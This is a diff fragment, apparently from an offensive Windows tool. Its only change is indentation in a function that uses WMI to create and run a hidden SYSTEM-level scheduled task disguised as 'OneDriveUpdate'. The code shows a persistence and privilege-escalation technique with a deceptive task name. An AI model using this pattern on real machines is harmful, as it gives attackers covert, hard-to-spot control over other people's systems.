@@ -66,12 +66,12 @@ def schtask(payload):
 		print_info("Attempting to create persistent schtask with SYSTEM privledges")
 		if (os.path.isfile(os.path.join(tempfile.gettempdir(),"elevator.xml")) == True):
 			create = wmi.Win32_Process.Create(CommandLine="schtasks /create /xml {} /tn OneDriveUpdate".format(os.path.join(tempfile.gettempdir(),"elevator.xml")),
-												ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
+								ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
 			
 			if (create[1] == 0):
 				print_success("Successfully created schtask")
 				run = wmi.Win32_Process.Create(CommandLine="schtasks /run /tn OneDriveUpdate",
-													ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
+								ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=0))
 				
 				print_info("Pausing for 5 seconds before running schtask")
 				time.sleep(5)
